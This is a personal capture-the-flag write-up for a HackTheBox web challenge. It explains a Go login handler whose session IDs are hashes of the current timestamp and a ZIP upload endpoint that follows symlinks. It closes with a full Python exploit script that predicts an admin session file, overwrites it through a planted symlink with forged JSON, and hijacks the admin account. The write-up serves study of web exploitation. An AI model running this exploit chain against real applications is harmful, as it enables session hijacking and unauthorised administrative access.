---
modified: 2026-04-21T18:44:13+03:00
created: 2026-04-21T14:18:46+03:00
name: Desire
starting_date: 2026-04-21
private: true
tags:
machine_link:
difficulty:
type:
---
## Overview
This challenge involves exploiting a web application (likely written in Go) that suffers from two critical vulnerabilities: **predictable session ID generation** and an **insecure ZIP extraction** process. By chaining these flaws, an attacker can predict an administrator's session file path, use a symlink attack to overwrite it with forged JSON data, and successfully hijack the admin account to retrieve the flag.
## the login problem
We can llook the function login. As we can see this function had problems of **Predictability** ans **Session pollution**
```go
func LoginHandler(c *fiber.Ctx) error {
	var credentials Credentials
	...
	
	// hexadecimal-encoded SHA-256 hash of the current Unix timestamp in *second*
	// easy to predict
	sessionID := fmt.Sprintf("%x", sha256.Sum256([]byte(strconv.FormatInt(time.Now().Unix(), 10))))

	// prepare session is created with just the username
	err := PrepareSession(sessionID, credentials.Username)
	...
	user, err := loginUser(credentials.Username, credentials.Password)
	....
	
	// Create a session based just on the username
	sessId := CreateSession(sessionID, user)

	// we can understand the current Unix timestamp
	// 5 months exprires
	cookie := fiber.Cookie{
		Name:    "session",
		Value:   sessId,
		Expires: time.Now().Add(3600 * time.Hour),
	}

	c.Cookie(&cookie)
	
	usernameCookie := fiber.Cookie{
		Name:    "username",
		Value:   credentials.Username,
		Expires: time.Now().Add(3600 * time.Hour),
	}

	c.Cookie(&usernameCookie)

	return c.Redirect("/user/upload")
}
```

---

### Vulnerability Analysis

#### 1. Insecure Session Generation (Cryptographic Flaw)

The application generates session IDs using a simple SHA-256 hash of the current Unix timestamp (in seconds). Because the precision is limited to a single second, the entropy is effectively zero if the attacker knows exactly when a session was created.

#### 2. Arbitrary File Write via Symlink Following

The application features a file upload endpoint (`/user/upload`) that accepts ZIP archives and extracts them into a user-specific directory. While the extraction library likely protects against traditional "Zip Slip" directory traversal (e.g., blocking `../` in filenames), it fails to prevent **symlink following**. If a user uploads a symlink pointing to a sensitive system file, and then uploads a second regular file with the exact same name, the archiver will open the symlink and write the new file's contents directly into the targeted destination.

---

## The Exploitation Chain

The attack requires precision timing and a multi-step upload process to bypass the extraction protections.

### Step 1: Session Prediction & Forcing Creation

To hijack the admin session, the session file must actually exist on the disk. The exploit script first triggers a fake login attempt for the `admin` user (`password: "passata di pomodoro"`). Immediately after triggering this login, the script captures its own local timestamp and hashes it. Because the attacker controls the exact moment the server processes the login, the local hash matches the server's generated session ID. We trigger the login for run the function `PrepareSession`.

- **Target Path:** `/tmp/sessions/admin/<predicted_sha256_hash>`

### Step 2: The Two-Step Symlink Overwrite

With the target file path known, the exploit leverages the ZIP upload endpoint to overwrite the admin's session data.

1. **The Portal (Upload 1):** A ZIP archive is uploaded containing a symbolic link with a randomized name (e.g., `e3b0c442...`). This link points directly to the predicted admin session file in `/tmp/sessions/admin/`.
2. **The Payload (Upload 2):** A second ZIP is uploaded containing a flat, regular file bearing the _exact same randomized name_. The contents of this file contain the forged JSON session data:
    ```json
    {
        "username": "admin",
        "id": 2,
        "role": "admin"
    }
    ```
    

When the backend extracts the second archive, it attempts to write to the file. Finding the symlink created in Step 1, the operating system follows it and writes the forged JSON directly over the administrator's actual session file.

### Step 3: Session Hijacking

Once the admin session file on the server has been overwritten with the payload, the final step is to switch the local session context. The script modifies the local `username` cookie to `admin`. When the request is sent to the `/user/admin` endpoint, the server reads the poisoned session file, deserializes the JSON into its Go struct, and grants administrative access, revealing the `HTB{...}` flag.

---

###Exploit Code
```python
from asyncio import selector_events
from requests.cookies import RequestsCookieJar
import requests
import hashlib
import time
import zipfile
import io
from datetime import datetime
import secrets
import json

# Configuration
BASE_URL = "http://154.57.164.75:32692"
USERNAME = "attacker_dev"
PASSWORD = "password123"


def get_session_id(timestamp):
    """Replicates the Go server's session ID generation."""
    return hashlib.sha256(str(int(timestamp)).encode()).hexdigest()


def create_symlink_zip(link_name, target_path):
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w") as zip_file:
        zip_info = zipfile.ZipInfo(link_name)
        # 0xA000 is the bitmask for a symlink
        zip_info.external_attr = 0xA000 << 16 
        zip_file.writestr(zip_info, target_path)
    return zip_buffer.getvalue()


def create_flat_zip(filename, content):
    """Creates a ZIP with a file at the root (no subdirectories)."""
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w") as zip_file:
        zip_file.writestr(filename, content)
    return zip_buffer.getvalue()

def exploit():
    session = requests.Session()

    print(f"[*] Registering user: {USERNAME}")
    session.post(
        f"{BASE_URL}/register", json={"username": USERNAME, "password": PASSWORD}
    )
    session.post(
        f"{BASE_URL}/register", json={"username": "admin", "password": PASSWORD}
    )
    requests.post(f"{BASE_URL}/login", json={"username": "admin", "password": PASSWORD})

    
    time.sleep(2)
    # trigger login admin
    requests.post(f"{BASE_URL}/login", json={"username": "admin", "password": "passata di pomodoro"})
    timestamp_str = str(int(time.time()))
    session_id = get_session_id(timestamp_str.encode())

    print(f"[*] Logging in as: {USERNAME}")
    session.post(f"{BASE_URL}/login", json={"username": USERNAME, "password": PASSWORD})

    test_target = f"/tmp/sessions/admin/{session_id}"
    random_name = secrets.token_hex(16)

    print(f"[*] Step 1: Creating flat symlink pointing to {test_target}")
    step1_zip = create_symlink_zip(random_name, test_target)
    response = session.post(f"{BASE_URL}/user/upload", files={"archive": ("step1.zip", step1_zip)})
    print(f"{response.text}")

    data = {
        "username": "admin",
        "id": 2,
        "role": "admin"
    }
    print("[*] Step 2: Overwriting through the link")
    step2_zip = create_flat_zip(random_name, json.dumps(data))
    response = session.post(f"{BASE_URL}/user/upload", files={"archive": ("step2.zip", step2_zip)})
    print(f"{response.text}")

    for cookie in session.cookies:
      if cookie.name == 'username':
          cookie.value = 'admin'
          break
    response = session.get(f"{BASE_URL}/user/admin")

    print(response.text)

    if "HTB{" in response.text:
        print("[!] Success! Flag found:")
        print(response.text)
    else:
        print("[-] Exploit failed. You might need to adjust the timing.")


if __name__ == "__main__":
    exploit()

```